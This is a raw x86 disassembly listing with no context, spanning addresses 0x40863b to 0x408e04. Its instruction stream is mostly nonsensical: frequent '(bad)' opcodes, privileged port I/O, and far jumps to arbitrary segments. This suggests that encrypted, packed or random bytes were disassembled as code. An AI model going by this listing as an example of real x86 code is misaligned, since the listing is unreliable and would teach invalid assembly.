  40863b:	mov    dl,BYTE PTR [eax+0x4f20817]
  408641:	mov    edx,0x2282ba8f
  408646:	ins    BYTE PTR es:[edi],dx
  408647:	ror    BYTE PTR [edx],0x58
  40864a:	inc    edx
  40864b:	and    esi,DWORD PTR [esp+esi*8-0x7532dd11]
  408652:	adc    al,0xcd
  408654:	popa   
  408655:	pushf  
  408656:	sub    BYTE PTR ds:0x38364b08,0x84
  40865d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40865e:	mov    ebp,DWORD PTR [edx]
  408660:	push   ds
  408661:	fisubr WORD PTR [eax]
  408663:	stos   BYTE PTR es:[edi],al
  408664:	stos   DWORD PTR es:[edi],eax
  408665:	mov    al,0x48
  408667:	mov    dh,0x8d
  408669:	sub    eax,0xe5f045f1
  40866e:	mov    ecx,ebp
  408670:	add    BYTE PTR [ebp-0x7e],0x4b
  408674:	(bad)  
  408675:	shl    DWORD PTR [ebp+0x278a6cfa],cl
  40867b:	sbb    eax,0x3db8951e
  408680:	dec    ebp
  408681:	inc    edx
  408682:	loopne 0x408618
  408684:	inc    edi
  408685:	imul   edx,DWORD PTR [ecx],0xffffff8d
  408688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408689:	push   esp
  40868a:	push   eax
  40868b:	ds pop ebx
  40868d:	enter  0xd1f,0x5f
  408691:	ss pop ds
  408693:	jne    0x40861b
  408695:	pop    esi
  408696:	pop    eax
  408697:	loopne 0x40865a
  408699:	pop    ebx
  40869a:	sub    eax,0x78c03e9d
  40869f:	or     bl,BYTE PTR [edi+0x34]
  4086a2:	inc    eax
  4086a3:	jp     0x408721
  4086a5:	sbb    edx,DWORD PTR [eax-0x82dd2c6]
  4086ab:	stc    
  4086ac:	lds    ecx,FWORD PTR [esi]
  4086ae:	inc    edi
  4086af:	xchg   BYTE PTR [esi+0x25cd6180],dl
  4086b5:	mov    dh,0xae
  4086b7:	sar    DWORD PTR [ebp+0x45],1
  4086ba:	pusha  
  4086bb:	loop   0x408688
  4086bd:	xchg   ebx,eax
  4086be:	push   es
  4086bf:	aam    0x45
  4086c1:	add    al,0xc
  4086c3:	rcr    DWORD PTR [edx-0x72a12cc7],cl
  4086c9:	(bad)  
  4086ca:	xchg   edi,eax
  4086cb:	jmp    0x408650
  4086cd:	jb     0x4086e6
  4086cf:	add    eax,0x55e6bcf1
  4086d4:	lds    edi,FWORD PTR [ecx+0x4f]
  4086d7:	nop
  4086d8:	sub    eax,eax
  4086da:	jo     0x4086d2
  4086dc:	push   ds
  4086dd:	jnp    0x4086ff
  4086df:	xchg   ecx,eax
  4086e0:	sahf   
  4086e1:	int    0xab
  4086e3:	pop    esp
  4086e4:	jp     0x408691
  4086e6:	jg     0x4086df
  4086e8:	inc    edx
  4086e9:	ss push 0x38
  4086ec:	idiv   DWORD PTR [esi+0x44d6e2da]
  4086f2:	(bad)  
  4086f3:	aad    0xb4
  4086f5:	adc    BYTE PTR [esi],bh
  4086f7:	jle    0x408706
  4086f9:	add    eax,0xaea73c00
  4086fe:	in     eax,0xfa
  408700:	rcr    BYTE PTR [edi+eiz*2-0x79dfe181],0x50
  408708:	(bad)  
  408709:	cmp    eax,DWORD PTR ds:0x8fe2d574
  40870f:	hlt    
  408710:	outs   dx,DWORD PTR ds:[esi]
  408711:	cmp    DWORD PTR [esi+0x2c],eax
  408714:	or     al,0x8e
  408716:	addr16 jge 0x40872c
  408719:	xor    eax,0x70cd208
  40871e:	xor    esi,ebp
  408720:	ja     0x4086d6
  408722:	stc    
  408723:	sbb    al,0xb8
  408725:	jg     0x4086a9
  408727:	adc    bl,bh
  408729:	push   ebx
  40872a:	(bad)
  40872e:	add    BYTE PTR [edi+0x3b],cl
  408731:	and    al,BYTE PTR [ebx-0x1db25a35]
  408737:	std    
  408738:	push   cs
  408739:	xor    BYTE PTR [bx+si+0x4c1c],bh
  40873e:	mov    ebx,fs
  408740:	cdq    
  408741:	(bad)  
  408742:	fsub   DWORD PTR [edi-0x42]
  408745:	lahf   
  408746:	xchg   ebp,eax
  408747:	add    BYTE PTR [bp+si-0x5d51],al
  40874c:	xor    edi,ebp
  40874e:	sbb    eax,0x327fc83c
  408753:	xchg   BYTE PTR [edi-0x57],dh
  408756:	and    BYTE PTR ds:0xb26f62d3,bh
  40875c:	xchg   ebx,eax
  40875d:	mov    es,WORD PTR [ebx-0x481ff7e6]
  408763:	cld    
  408764:	mov    ds:0xff247437,al
  408769:	outs   dx,BYTE PTR ds:[esi]
  40876a:	sub    dh,dh
  40876c:	push   ss
  40876d:	neg    DWORD PTR [esi-0x1c]
  408770:	mov    edi,DWORD PTR [esi-0x7ab59385]
  408776:	and    eax,0xb025136f
  40877b:	out    0x4c,eax
  40877d:	pop    ecx
  40877e:	bound  ebp,QWORD PTR [ebx+0x5e5582c1]
  408784:	cmp    eax,0x64d60968
  408789:	mov    al,0xec
  40878b:	repz jns 0x40878c
  40878e:	dec    edx
  40878f:	outs   dx,BYTE PTR ds:[esi]
  408790:	mov    BYTE PTR [ebp+0x2221baab],dh
  408796:	adc    al,0xfc
  408798:	out    dx,al
  408799:	loopne 0x4087ab
  40879b:	cli    
  40879c:	stos   BYTE PTR es:[edi],al
  40879d:	int    0x44
  40879f:	retf   0xa0da
  4087a2:	ret    0x44bb
  4087a5:	into   
  4087a6:	jo     0x4087de
  4087a8:	xor    al,0x11
  4087aa:	fist   DWORD PTR [ecx+0x18]
  4087ad:	outs   dx,BYTE PTR ds:[esi]
  4087ae:	inc    ecx
  4087af:	adc    DWORD PTR ds:0xc18fa23f,esp
  4087b5:	or     DWORD PTR [ecx],ebp
  4087b7:	lea    esi,[eax-0x1f]
  4087ba:	inc    ecx
  4087bb:	sbb    BYTE PTR [edi-0x59],ah
  4087be:	xchg   ecx,eax
  4087bf:	add    al,0x2f
  4087c1:	sub    esp,0x4e09c859
  4087c7:	shr    BYTE PTR [edi+0x43e62df],cl
  4087cd:	xchg   DWORD PTR [eax-0x80],eax
  4087d0:	in     al,0x1b
  4087d2:	test   BYTE PTR [esi+0x1f3acdc4],0x4f
  4087d9:	outs   dx,DWORD PTR ds:[esi]
  4087da:	in     al,0xeb
  4087dc:	xlat   BYTE PTR ds:[ebx]
  4087dd:	push   cs
  4087de:	xor    edx,DWORD PTR [eax+esi*4]
  4087e1:	xchg   ebx,eax
  4087e2:	in     al,dx
  4087e3:	xor    dl,bl
  4087e5:	jle    0x4087f5
  4087e7:	sub    BYTE PTR [ebp-0x71],bh
  4087ea:	mov    esi,0x9b013f95
  4087ef:	or     al,0xbb
  4087f1:	bound  ebx,QWORD PTR [esi+esi*1+0x77]
  4087f5:	enter  0x642a,0x18
  4087f9:	mov    dl,0x3e
  4087fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087fc:	mov    fs:0x34f804f,eax
  408802:	sub    eax,0xd0c47511
  408807:	jl     0x408817
  408809:	inc    edx
  40880a:	ds and eax,0xcd8af701
  408810:	sub    eax,0x58f4032c
  408815:	repnz cmp al,dh
  408818:	or     eax,0xcf42e778
  40881d:	in     eax,0x2c
  40881f:	retf   
  408820:	xchg   edx,eax
  408821:	jmp    0x917a41e3
  408826:	in     al,0xf1
  408828:	pop    esi
  408829:	adc    edx,ecx
  40882b:	pop    esp
  40882c:	push   eax
  40882d:	mov    bh,0xf1
  40882f:	or     al,0xfb
  408831:	sti    
  408832:	jbe    0x40883e
  408834:	les    esi,FWORD PTR [eax-0x77]
  408837:	clc    
  408838:	push   eax
  408839:	xor    ch,BYTE PTR [edi-0x2df800bc]
  40883f:	push   edi
  408840:	dec    eax
  408841:	adc    DWORD PTR [ecx],esi
  408843:	sbb    al,0xf3
  408845:	jae    0x4087ef
  408847:	ror    DWORD PTR [eax+0x689502ae],cl
  40884d:	jmp    DWORD PTR [eax-0x35]
  408850:	adc    DWORD PTR [ebp-0x3e],0x55773c8c
  408857:	jb     0x4088d1
  408859:	retf   
  40885a:	inc    edi
  40885b:	retf   0xeec8
  40885e:	inc    ebp
  40885f:	pop    edx
  408860:	add    al,0x6d
  408862:	jnp    0x40887e
  408864:	cmp    al,0x7d
  408866:	int    0x99
  408868:	fwait
  408869:	dec    esi
  40886a:	aam    0xf1
  40886c:	rol    DWORD PTR [edi-0x16],0x9f
  408870:	bound  eax,QWORD PTR [edx]
  408872:	and    DWORD PTR [eax-0x45],edx
  408875:	sub    eax,0xe942624
  40887a:	push   cs
  40887b:	pop    esi
  40887c:	mov    edx,0x62bd1d81
  408881:	es pop edx
  408883:	cmp    DWORD PTR [eax+ecx*4+0x2e1f21ba],ebx
  40888a:	add    BYTE PTR [ebx+0x3d693bd4],dl
  408890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408891:	sbb    BYTE PTR [edi+0x70738aa3],dh
  408897:	add    BYTE PTR [edi-0x6a],al
  40889a:	sub    BYTE PTR [ebp-0x27],al
  40889d:	lods   al,BYTE PTR ds:[esi]
  40889e:	popa   
  40889f:	lods   eax,DWORD PTR ds:[esi]
  4088a0:	sbb    al,0x8
  4088a2:	cld    
  4088a3:	call   0x788a:0xdf99d90e
  4088aa:	pop    esp
  4088ab:	xor    ah,BYTE PTR [edx+edi*2+0x35]
  4088af:	leave  
  4088b0:	aad    0x24
  4088b2:	and    BYTE PTR [eax-0x25cfc019],bl
  4088b8:	add    edx,edi
  4088ba:	fsub   DWORD PTR [edi+eiz*2-0x7ad8a188]
  4088c1:	call   0xb4f4c385
  4088c6:	sbb    ecx,eax
  4088c8:	and    edx,DWORD PTR [ebx+0x4]
  4088cb:	lds    edi,FWORD PTR [ebx-0x4169b7af]
  4088d1:	outs   dx,DWORD PTR ds:[esi]
  4088d2:	bound  esp,QWORD PTR [ebp+ebx*8-0x48]
  4088d6:	loop   0x408931
  4088d8:	mov    ds:0xeabc5967,al
  4088dd:	(bad)  [eax-0x1c]
  4088e0:	mov    bl,0x8c
  4088e2:	sbb    dl,0x6e
  4088e5:	and    esi,esp
  4088e7:	repz es xchg esi,eax
  4088ea:	mov    ebx,0xdc13c9c0
  4088ef:	jmp    0x6ba4d884
  4088f4:	or     ecx,DWORD PTR [edi]
  4088f6:	adc    DWORD PTR [esi+0x4ed54b42],edx
  4088fc:	pop    eax
  4088fd:	xor    BYTE PTR [ebp+0x78c85f36],cl
  408903:	mov    dl,0xba
  408905:	int3   
  408906:	shl    ebx,cl
  408908:	sahf   
  408909:	cwde   
  40890a:	jl     0x408921
  40890c:	sbb    dh,al
  40890e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40890f:	out    dx,al
  408910:	jnp    0x408917
  408912:	popf   
  408913:	xchg   ebp,eax
  408914:	or     al,0xbf
  408916:	arpl   WORD PTR [ecx],bp
  408918:	dec    eax
  408919:	cmp    eax,0xd94a53a3
  40891e:	push   ds
  40891f:	sbb    BYTE PTR [esi+ecx*8+0x5f636eef],bl
  408926:	mov    ds:0x9bdce28c,eax
  40892b:	dec    esi
  40892c:	inc    ebp
  40892d:	adc    ebp,DWORD PTR [edi+0x5f]
  408930:	mov    ebx,0x78a0a69d
  408935:	add    eax,0x69946e63
  40893a:	push   es
  40893b:	hlt    
  40893c:	push   cs
  40893d:	sub    ecx,esp
  40893f:	and    DWORD PTR [ebx],edi
  408941:	daa    
  408942:	or     ebx,DWORD PTR [edx+0x1f]
  408945:	pop    eax
  408946:	mov    ebp,edx
  408948:	inc    ebx
  408949:	push   0xffffffc4
  40894b:	jnp    0x4088fe
  40894d:	(bad)  
  40894e:	fxam   
  408950:	scas   al,BYTE PTR es:[edi]
  408951:	sahf   
  408952:	and    ecx,DWORD PTR ds:0x8a8c4047
  408958:	icebp  
  408959:	out    dx,al
  40895a:	add    al,0x78
  40895c:	nop
  40895d:	mov    al,ds:0xf72301e3
  408962:	mov    dl,0x68
  408964:	fstp   TBYTE PTR [edx+0x45e53420]
  40896a:	inc    esp
  40896b:	pusha  
  40896c:	stc    
  40896d:	dec    esi
  40896e:	cmp    ecx,DWORD PTR [ebx+0x79]
  408971:	nop
  408972:	test   al,0x8e
  408974:	xchg   DWORD PTR [eax+0x2],esp
  408977:	xchg   DWORD PTR [edi+ebx*2],esp
  40897a:	test   DWORD PTR [ebp+0x3],esp
  40897d:	xor    esi,DWORD PTR [ecx-0x38455472]
  408983:	add    eax,0xe291e1cd
  408988:	repz cdq 
  40898a:	sub    dl,BYTE PTR [ebp-0x6f526632]
  408990:	test   al,0x38
  408992:	mov    bh,0xe7
  408994:	je     0x40896a
  408996:	xor    BYTE PTR [ecx+0x4c],bl
  408999:	xchg   DWORD PTR [edx],edx
  40899b:	les    edi,FWORD PTR [esi+0x4df52f43]
  4089a1:	adc    eax,DWORD PTR [esp+eiz*4+0x2]
  4089a5:	fadd   QWORD PTR ds:0xd0f1a21b
  4089ab:	dec    ecx
  4089ac:	shl    BYTE PTR [ebp+0x72],cl
  4089af:	std    
  4089b0:	ss push esi
  4089b2:	pop    edx
  4089b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089b4:	ss retf 
  4089b6:	retf   0xd73e
  4089b9:	sar    BYTE PTR [edi-0x54],0x86
  4089bd:	push   ss
  4089be:	lock push edi
  4089c0:	inc    edx
  4089c1:	sar    BYTE PTR [ecx-0x4fd67cf6],0x12
  4089c8:	pop    ds
  4089c9:	or     esi,DWORD PTR [ebp+eax*1+0x26]
  4089cd:	test   eax,edi
  4089cf:	mov    BYTE PTR [ebp+0x31],0x99
  4089d3:	pop    eax
  4089d4:	jl     0x4089bc
  4089d6:	mov    ebp,0x72e73e8a
  4089db:	rcl    DWORD PTR [esi+0x7d20d837],1
  4089e1:	out    0x30,al
  4089e3:	mov    eax,ds:0x403f747c
  4089e8:	adc    bh,bh
  4089ea:	adc    DWORD PTR [edi+0x28],0x65523d2b
  4089f1:	int3   
  4089f2:	aad    0x1a
  4089f4:	cmp    DWORD PTR [edx-0x10],edx
  4089f7:	cli    
  4089f8:	and    DWORD PTR [bx],esi
  4089fb:	jecxz  0x408a0b
  4089fd:	les    edx,FWORD PTR [bx]
  408a00:	xchg   BYTE PTR [ecx-0x65db34b3],al
  408a06:	ins    DWORD PTR es:[edi],dx
  408a07:	je     0x4089cb
  408a09:	outs   dx,DWORD PTR ds:[esi]
  408a0a:	and    DWORD PTR [ebx*4+0x510afc25],ebx
  408a11:	jae    0x408a3d
  408a13:	mov    ebx,0x55b912fa
  408a18:	call   0xc9f38a4e
  408a1d:	ds push esi
  408a1f:	call   0x3b228974
  408a24:	xor    al,0x8f
  408a26:	cdq    
  408a27:	fisttp QWORD PTR [eax]
  408a29:	popf   
  408a2a:	test   eax,0x48bcbd27
  408a2f:	pushf  
  408a30:	and    DWORD PTR [ebx+0x6e540d03],ebx
  408a36:	nop
  408a37:	mov    WORD PTR [ebx],cs
  408a39:	xor    edi,DWORD PTR [ecx-0x4fb22dcb]
  408a3f:	cs sahf 
  408a41:	lds    edx,FWORD PTR [edx-0x5f]
  408a44:	outs   dx,BYTE PTR ds:[esi]
  408a45:	jb     0x408a33
  408a47:	pop    eax
  408a48:	dec    edi
  408a49:	enter  0xf8be,0x6b
  408a4d:	inc    esi
  408a4e:	cs dec eax
  408a50:	andps  xmm2,xmm2
  408a53:	leave  
  408a54:	call   0xe5427da2
  408a59:	imul   ebp,DWORD PTR [eax+esi*4],0x83c07eb0
  408a60:	cdq    
  408a61:	inc    esi
  408a62:	xchg   ecx,eax
  408a63:	pop    ebx
  408a64:	scas   al,BYTE PTR es:[edi]
  408a65:	pop    ebp
  408a66:	push   esp
  408a67:	stos   BYTE PTR es:[edi],al
  408a68:	inc    ebx
  408a69:	jmp    0x6ed2:0x956a318e
  408a70:	fwait
  408a71:	adc    ebx,edx
  408a73:	aad    0x2c
  408a75:	mov    ch,BYTE PTR [esi-0xd4215e8]
  408a7b:	shr    BYTE PTR [edx],0x6a
  408a7e:	stos   BYTE PTR es:[edi],al
  408a7f:	daa    
  408a80:	js     0x408a7f
  408a82:	push   edx
  408a83:	inc    ebx
  408a84:	cmc    
  408a85:	shufps xmm4,XMMWORD PTR [esi+0x7],0xfc
  408a8a:	scas   eax,DWORD PTR es:[edi]
  408a8b:	in     eax,dx
  408a8c:	and    ebx,DWORD PTR [edx]
  408a8e:	arpl   WORD PTR [edx-0x80],sp
  408a91:	mov    ds:0x1c16887c,eax
  408a96:	and    edx,esp
  408a98:	mov    ah,0xb1
  408a9a:	cmp    DWORD PTR [eax],ecx
  408a9c:	xlat   BYTE PTR ds:[ebx]
  408a9d:	sbb    BYTE PTR [ebx+edi*1+0x6ac4ef02],al
  408aa4:	pop    ecx
  408aa5:	and    edx,DWORD PTR [ecx]
  408aa7:	inc    edi
  408aa8:	repnz test eax,0xe385214
  408aae:	jmp    0x143e:0x5a45781d
  408ab5:	cmp    eax,0x12fd2063
  408aba:	ins    DWORD PTR es:[edi],dx
  408abb:	and    edx,esp
  408abd:	mov    ebx,0xde5f813a
  408ac2:	inc    esi
  408ac3:	mov    edx,edx
  408ac5:	(bad)  [esi+0x1ae84094]
  408acb:	shr    BYTE PTR [eax+ecx*8],0x69
  408acf:	pop    ebp
  408ad0:	push   ds
  408ad1:	xor    ebp,DWORD PTR [esp+eax*1+0x60]
  408ad5:	or     al,0xd9
  408ad7:	aaa    
  408ad8:	mov    BYTE PTR [eax+edi*2+0x5b],cl
  408adc:	loop   0x408b58
  408ade:	sahf   
  408adf:	jnp    0x408a71
  408ae1:	idiv   ch
  408ae3:	out    dx,eax
  408ae4:	mov    WORD PTR [ecx-0x37],?
  408ae7:	sahf   
  408ae8:	xor    eax,0x621e4d8
  408aed:	dec    ebp
  408aee:	sar    BYTE PTR [ecx+0x65],1
  408af1:	lods   eax,DWORD PTR ds:[esi]
  408af2:	or     eax,0x95432638
  408af7:	xor    DWORD PTR [esp+eiz*2],0xffffffae
  408afb:	cmp    eax,0x57aa46a8
  408b00:	pop    ecx
  408b01:	sub    ebx,ebx
  408b03:	call   0x50053254
  408b08:	cmp    cl,ah
  408b0a:	sbb    DWORD PTR [edi+0x3b],ecx
  408b0d:	mov    ah,BYTE PTR [ebp+ebp*4+0x6c]
  408b11:	xor    DWORD PTR ds:0x178d3897,ecx
  408b17:	fwait
  408b18:	jae    0x408b4a
  408b1a:	in     eax,0x94
  408b1c:	mov    bh,0xa9
  408b1e:	mov    ch,0x70
  408b20:	mov    ebp,0x58a0f23f
  408b25:	jns    0x408b5a
  408b27:	mov    BYTE PTR [ecx-0x76],bh
  408b2a:	xor    eax,0x936c60ac
  408b2f:	enter  0xa0f0,0x22
  408b33:	jp     0x408b3a
  408b35:	push   ebp
  408b36:	xor    bl,bh
  408b38:	cmp    eax,0x1d3f0429
  408b3d:	sbb    eax,0x24169072
  408b42:	add    BYTE PTR [edx],dl
  408b44:	in     eax,dx
  408b45:	cwde   
  408b46:	xchg   esp,eax
  408b47:	add    dl,BYTE PTR [edi-0x62c76fd9]
  408b4d:	pop    ss
  408b4e:	or     eax,0xc85577fe
  408b53:	xor    esi,DWORD PTR [ebx-0x40]
  408b56:	adc    al,0xda
  408b58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b59:	mov    ah,0xab
  408b5b:	fs pop esp
  408b5d:	shr    BYTE PTR es:[eax],cl
  408b60:	push   edi
  408b61:	inc    ebp
  408b62:	cmp    esi,eax
  408b64:	add    DWORD PTR [esi-0x10797c31],esp
  408b6a:	cli    
  408b6b:	mov    cl,0x7d
  408b6d:	inc    ebx
  408b6e:	or     bh,cl
  408b70:	mov    bl,0x55
  408b72:	sub    BYTE PTR [esi-0x7c],dl
  408b75:	jo     0x408b3d
  408b77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b78:	mov    ds,WORD PTR [edx-0x2b]
  408b7b:	sub    ebp,DWORD PTR [edi+0x4cb9aafc]
  408b81:	cmp    bh,0x1c
  408b84:	mov    edi,0x4edc948b
  408b89:	rcl    BYTE PTR [ebx-0x124c5330],cl
  408b8f:	pop    es
  408b90:	add    eax,0x9babf614
  408b95:	xchg   ecx,eax
  408b96:	xchg   esp,eax
  408b97:	sbb    DWORD PTR [esi-0x7],ecx
  408b9a:	sahf   
  408b9b:	lds    esp,FWORD PTR [edi]
  408b9d:	adc    bl,bl
  408b9f:	retf   
  408ba0:	push   eax
  408ba1:	mov    dh,0xfd
  408ba3:	sbb    DWORD PTR [eax+0x1be7ae83],esi
  408ba9:	sub    DWORD PTR [esi-0x59c484ef],edi
  408baf:	hlt    
  408bb0:	test   DWORD PTR [ebp-0x44],esi
  408bb3:	ins    DWORD PTR es:[edi],dx
  408bb4:	sahf   
  408bb5:	fnstenv [edx]
  408bb7:	pusha  
  408bb8:	mov    al,ds:0x93e9eff0
  408bbd:	jmp    0xafb7b31c
  408bc2:	mov    ds:0xf8103098,al
  408bc7:	jns    0x408b8e
  408bc9:	mov    esi,0xe1629844
  408bce:	out    0x5c,eax
  408bd0:	sahf   
  408bd1:	jns    0x408b8a
  408bd3:	aam    0x40
  408bd5:	and    esp,eax
  408bd7:	xchg   ebx,eax
  408bd8:	inc    esi
  408bd9:	and    eax,0x436165ce
  408bde:	inc    DWORD PTR [ebp+edi*4-0x51a5adc0]
  408be5:	adc    eax,edx
  408be7:	rcl    BYTE PTR [ebx+eiz*1-0x10],1
  408beb:	adc    al,0x21
  408bed:	test   eax,0x3717394b
  408bf2:	call   0xb909:0x4db26c43
  408bf9:	js     0x408b99
  408bfb:	push   DWORD PTR [ecx+ebp*8]
  408bfe:	inc    eax
  408bff:	xchg   ebp,eax
  408c00:	push   cs
  408c01:	jge    0x408c80
  408c03:	cmc    
  408c04:	cs inc esi
  408c06:	or     al,ch
  408c08:	mov    al,0xe9
  408c0a:	outs   dx,DWORD PTR ds:[esi]
  408c0b:	push   esi
  408c0c:	aam    0x84
  408c0e:	(bad)  
  408c0f:	sti    
  408c10:	fs rol ebp,0x62
  408c14:	cwde   
  408c15:	aaa    
  408c16:	mov    dl,0x8f
  408c18:	aam    0xda
  408c1a:	pop    ebx
  408c1b:	nop
  408c1c:	es pop esi
  408c1e:	lods   al,BYTE PTR ds:[esi]
  408c1f:	adc    DWORD PTR [edi],edi
  408c21:	pop    ss
  408c22:	sbb    edx,ebx
  408c24:	add    BYTE PTR [ebx-0x73],bl
  408c27:	or     edi,DWORD PTR [eax]
  408c29:	xchg   ebx,eax
  408c2a:	add    al,0x9d
  408c2c:	pop    edx
  408c2d:	pusha  
  408c2e:	or     ebp,DWORD PTR [edi-0x581a0956]
  408c34:	into   
  408c35:	mov    ebp,0x57ca8d83
  408c3a:	xchg   esp,eax
  408c3b:	dec    ecx
  408c3c:	dec    DWORD PTR [ebx]
  408c3e:	sbb    bh,BYTE PTR ds:0x2b5a01f3
  408c44:	sbb    al,0x2
  408c46:	das    
  408c47:	xor    BYTE PTR [eax-0x5249e43],bh
  408c4d:	test   BYTE PTR [ebx],dl
  408c4f:	mov    esp,0x1b611a00
  408c54:	iret   
  408c55:	jecxz  0x408be5
  408c57:	mov    al,ds:0xc6d3bba0
  408c5c:	fist   DWORD PTR [edx-0x54]
  408c5f:	(bad)  
  408c60:	sub    eax,0xc23839c9
  408c65:	sahf   
  408c66:	test   al,0xcc
  408c68:	aad    0x1c
  408c6a:	mov    eax,0x39818a4b
  408c6f:	inc    eax
  408c70:	stc    
  408c71:	hlt    
  408c72:	cmp    BYTE PTR [ebp-0x15],bl
  408c75:	(bad)  
  408c76:	push   ecx
  408c77:	mov    bl,0x4e
  408c79:	jae    0x408cab
  408c7b:	and    edi,DWORD PTR [ecx]
  408c7d:	dec    esi
  408c7e:	addr16 adc al,0x4a
  408c81:	push   es
  408c82:	push   ss
  408c83:	(bad)  
  408c84:	sub    DWORD PTR [ebx+0x40],edx
  408c87:	mov    al,ds:0xcec7eb11
  408c8c:	ins    BYTE PTR es:[edi],dx
  408c8d:	cmp    al,0x31
  408c8f:	repz dec edx
  408c91:	mov    WORD PTR [eax],fs
  408c93:	xor    DWORD PTR [eax],0x40
  408c96:	cmp    DWORD PTR [edx],0xfffffffa
  408c99:	xor    dh,BYTE PTR [ebp-0x21]
  408c9c:	shl    edi,cl
  408c9e:	xchg   ecx,eax
  408c9f:	mov    ebx,0xe285c39e
  408ca4:	or     al,0x8f
  408ca6:	dec    edi
  408ca7:	or     DWORD PTR [edx],ebp
  408ca9:	inc    ebp
  408caa:	repnz dec esp
  408cac:	sub    ecx,DWORD PTR [edi-0x2e19c436]
  408cb2:	and    bl,BYTE PTR [esi+0x25]
  408cb5:	dec    esp
  408cb6:	jns    0x408d12
  408cb8:	cmp    BYTE PTR [esi+0x2f58cea9],0xce
  408cbf:	arpl   WORD PTR cs:[ecx+ebp*4+0x2d1f8e1a],cx
  408cc7:	xchg   edi,eax
  408cc8:	mov    WORD PTR [ebp+0x25953d5f],?
  408cce:	das    
  408ccf:	ins    BYTE PTR es:[edi],dx
  408cd0:	dec    esi
  408cd1:	gs sbb al,0x6d
  408cd4:	sub    al,0x3c
  408cd6:	mov    edx,0xc757e296
  408cdb:	fsubrp st(0),st
  408cdd:	cmp    eax,0x95955371
  408ce2:	pop    ecx
  408ce3:	int    0x8d
  408ce5:	js     0x408d42
  408ce7:	ficomp DWORD PTR [ebx-0x14]
  408cea:	or     DWORD PTR [eax+0x1],ecx
  408ced:	or     al,0x6d
  408cef:	bound  esi,QWORD PTR [ebp-0x72]
  408cf2:	pop    ss
  408cf3:	cmp    al,BYTE PTR [eax+esi*8]
  408cf6:	int    0xc0
  408cf8:	mov    eax,0xca046619
  408cfd:	mov    ds:0x77ff30f3,eax
  408d02:	out    0xd6,al
  408d04:	lods   eax,DWORD PTR ds:[esi]
  408d05:	popf   
  408d06:	fdivr  DWORD PTR [esi]
  408d08:	jmp    0xc367:0xfd526a89
  408d0f:	ror    DWORD PTR [eax+0x69183dba],cl
  408d15:	or     al,0x90
  408d17:	lods   eax,DWORD PTR ds:[esi]
  408d18:	mov    DWORD PTR [edx-0x15],ebp
  408d1b:	or     dh,cl
  408d1d:	adc    BYTE PTR [edi+0x65f8e05f],bl
  408d23:	pop    ds
  408d24:	icebp  
  408d25:	(bad)  
  408d26:	cmp    al,0x3
  408d28:	dec    esi
  408d29:	push   esp
  408d2a:	in     al,0xd1
  408d2c:	dec    edi
  408d2d:	xchg   edi,eax
  408d2e:	mov    eax,ds:0x2223ef30
  408d33:	pop    edx
  408d34:	es pop eax
  408d36:	mov    esi,0xff22de8e
  408d3b:	sbb    ah,BYTE PTR [ebx]
  408d3d:	ja     0x408cfc
  408d3f:	xor    DWORD PTR [ebp+esi*1+0x56],0x71
  408d44:	aam    0x8d
  408d46:	sub    eax,0x3ecb7771
  408d4b:	daa    
  408d4c:	cmp    edx,DWORD PTR [ebx-0x30]
  408d4f:	in     eax,dx
  408d50:	push   esp
  408d51:	popa   
  408d52:	fmul   QWORD PTR [esi]
  408d54:	jnp    0x408dc7
  408d56:	rcr    BYTE PTR [esi],cl
  408d58:	in     eax,0x49
  408d5a:	das    
  408d5b:	cs xchg ecx,eax
  408d5d:	jns    0x408ce8
  408d5f:	test   DWORD PTR [ecx+edi*4-0x679a3ad2],edi
  408d66:	sub    eax,0xa69fc88
  408d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d6c:	add    edx,eax
  408d6e:	sub    DWORD PTR [edx+0x3a],0xf31894b1
  408d75:	xchg   ebx,eax
  408d76:	popf   
  408d77:	push   cs
  408d78:	dec    esp
  408d79:	les    edx,FWORD PTR [edi]
  408d7b:	and    al,0xaa
  408d7d:	xor    BYTE PTR [ecx-0x62],dh
  408d80:	loopne 0x408d62
  408d82:	dec    esp
  408d83:	mov    edi,0xfcec5dcc
  408d88:	jl     0x408d21
  408d8a:	push   eax
  408d8b:	loopne 0x408d85
  408d8d:	xor    BYTE PTR [di+0x90d],ah
  408d92:	dec    edx
  408d93:	pop    edx
  408d94:	jae    0x408dc4
  408d96:	pop    ebp
  408d97:	add    eax,0xc9f25a9c
  408d9c:	push   ds
  408d9d:	cmp    eax,0xeaae87c2
  408da2:	jns    0x408d62
  408da4:	xlat   BYTE PTR ds:[ebx]
  408da5:	(bad)  
  408da6:	and    al,0x49
  408da8:	popa   
  408da9:	sub    al,0xa3
  408dab:	(bad)  
  408dac:	in     al,dx
  408dad:	jae    0x408e0d
  408daf:	stos   BYTE PTR es:[edi],al
  408db0:	inc    edi
  408db1:	or     eax,0xb5308974
  408db6:	es retf 
  408db8:	xlat   BYTE PTR ds:[ebx]
  408db9:	rcl    BYTE PTR ds:0x9a3dbf76,cl
  408dbf:	call   0xc67e:0xc46e0f46
  408dc6:	cld    
  408dc7:	push   0xffffffc3
  408dc9:	pusha  
  408dca:	cmp    al,dl
  408dcc:	lds    edx,FWORD PTR gs:[eax+0x15]
  408dd0:	js     0x408e3a
  408dd2:	lock sbb ebp,ebx
  408dd5:	dec    esi
  408dd6:	std    
  408dd7:	cli    
  408dd8:	inc    ebx
  408dd9:	cmp    BYTE PTR [ecx-0x69f5937e],al
  408ddf:	ja     0x408d97
  408de1:	fnsave [ebx]
  408de3:	fistp  DWORD PTR [edi+eax*2-0x65]
  408de7:	xchg   ecx,eax
  408de8:	xchg   edx,eax
  408de9:	xor    al,0x9f
  408deb:	add    BYTE PTR [eax-0x546df4b5],al
  408df1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408df2:	jne    0x408dfa
  408df4:	dec    edx
  408df5:	mov    al,ds:0x28701048
  408dfa:	neg    DWORD PTR [edi+ebx*4-0x1847dcb3]
  408e01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e02:	icebp  
  408e03:	pop    esp
  408e04:	pop    DWORD PTR [ebp+0x14]
